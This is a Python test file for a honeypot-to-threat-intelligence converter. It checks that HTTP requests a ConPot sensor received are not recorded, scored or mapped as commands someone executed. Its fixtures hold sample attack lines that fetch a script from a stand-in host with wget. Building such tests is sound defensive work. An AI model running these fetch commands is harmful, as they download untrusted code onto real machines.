"""A request a sensor RECEIVED is not a command anyone RAN.

ConPot appended raw HTTP request blobs to `session.commands` purely to reuse
Note rendering. Six downstream consumers then believed the field name.
"""
from __future__ import annotations

import pytest

from tpot2cti.parsers.base import AttackSession
from tpot2cti.parsers.conpot import ConPotParser


def _doc(request="GET /ecc/ HTTP/1.1\r\nHost: 10.0.0.1\r\n"):
    return {
        "type": "ConPot", "src_ip": "198.51.100.21", "dest_ip": "192.0.2.3",
        "dest_port": 80, "@timestamp": "2026-08-05T00:00:00.000Z",
        "t-pot_hostname": "sensor01", "request": request, "event_type": "http",
        "id": "abc123",
    }


def _session(docs):
    p = ConPotParser()
    events = [p.parse(d) for d in docs]
    return p.correlate([e for e in events if e is not None])


def test_a_received_request_is_not_recorded_as_a_command():
    sessions = _session([_doc()])
    assert sessions, "parser produced no session"
    s = sessions[0]
    assert s.protocol_requests, "the request blob was lost entirely"
    assert s.commands == [], (
        "a request the sensor RECEIVED is being reported as a command someone "
        "RAN — score, prose, Process SDOs and the bare-scan gate all read this"
    )


def test_a_received_request_no_longer_inflates_the_score():
    """The central claim of this fix, and the one with real downstream
    reach: `_signal_score` gave +25 for "commands", so every ConPot probe
    scored 75 instead of 50. Scores ratchet UP across cycles (the
    publisher's cross-cycle merge keeps max(score)), so an inflated score
    can never be walked back once published."""
    from tpot2cti.stix.builder import _signal_score
    s = _session([_doc()])[0]
    assert s.commands == []
    assert _signal_score(s) == 50, (
        "a received HTTP request is still being scored as executed commands"
    )


def test_a_received_request_does_not_map_to_command_execution():
    """T1059 is "Command and Scripting Interpreter". Nothing was
    interpreted — the sensor received bytes."""
    from tpot2cti.attack_mapping import techniques_for_session
    s = _session([_doc()])[0]
    techniques = techniques_for_session(s)
    assert not any("T1059" in str(t) for t in techniques), (
        f"a received request still maps to command execution: {techniques}"
    )


def test_no_urls_or_domains_are_harvested_from_a_request_line():
    """`_CMD_URL_RE` ran over `session.commands` and minted a URL AND a
    Domain-Name for every http:// substring, asserting "Payload URL fetched
    via ConPot". A URL in a request the attacker SENT US is not a URL the
    attacker FETCHED — it is, at most, a proxy target."""
    doc = _doc(request="GET /shell?cmd=wget+http://evil.example/x.sh HTTP/1.1\r\n")
    s = _session([doc])[0]
    from tpot2cti.config import load_config
    import os
    builder_cfg = load_config(dict(os.environ))
    from tpot2cti.stix.builder import STIXBuilder
    objs = STIXBuilder(builder_cfg).build_conpot_session(s)
    minted = [o for o in objs if o["type"] in ("url", "domain-name")]
    assert not minted, (
        f"observables harvested from a received request line: "
        f"{[o.get('value') for o in minted]}"
    )


def test_the_blob_is_still_preserved_as_evidence(builder, cfg):
    """Fixing the false claim must not lose the data. The blob is kept in a
    Note, honestly labelled, and never as a Process."""
    s = _session([_doc()])[0]
    objs = builder.build_conpot_session(s)
    kinds = [o["type"] for o in objs]
    assert "process" not in kinds, "still asserting a process was executed"
    notes = [o for o in objs if o["type"] == "note"]
    assert notes, "the request blob was dropped instead of preserved"
    body = notes[0]["content"]
    assert "GET /ecc/" in body, "the actual request is missing from the Note"
    assert "nothing was executed" in body


def test_genuine_shell_commands_are_untouched():
    """The positive control. Without it every assertion above passes
    vacuously the moment command capture breaks entirely.

    This must drive a REAL parser — an earlier version hand-built an
    AttackSession, appended to `.commands` and asserted `.commands` was
    non-empty, which is a tautology that cannot fail."""
    from tpot2cti.parsers.cowrie import CowrieParser
    from tpot2cti.stix.builder import _signal_score

    p = CowrieParser()
    docs = [{
        "type": "Cowrie", "src_ip": "198.51.100.21", "dest_ip": "192.0.2.3",
        "dest_port": 2222, "@timestamp": "2026-08-05T00:00:00.000Z",
        "t-pot_hostname": "sensor01", "eventid": "cowrie.command.input",
        "session": "abc123", "input": "wget http://evil.example/x.sh",
        "id": "c1",
    }]
    events = [e for e in (p.parse(d) for d in docs) if e is not None]
    assert events, "the Cowrie fixture stopped parsing — fix the fixture"
    sessions = p.correlate(events)
    s = sessions[0]

    assert s.commands == ["wget http://evil.example/x.sh"], (
        "real shell-command capture regressed"
    )
    assert not s.protocol_requests, "a shell command leaked into protocol_requests"
    # And the substance signal a real command SHOULD carry.
    assert _signal_score(s) > 50, "genuine commands no longer score as substance"
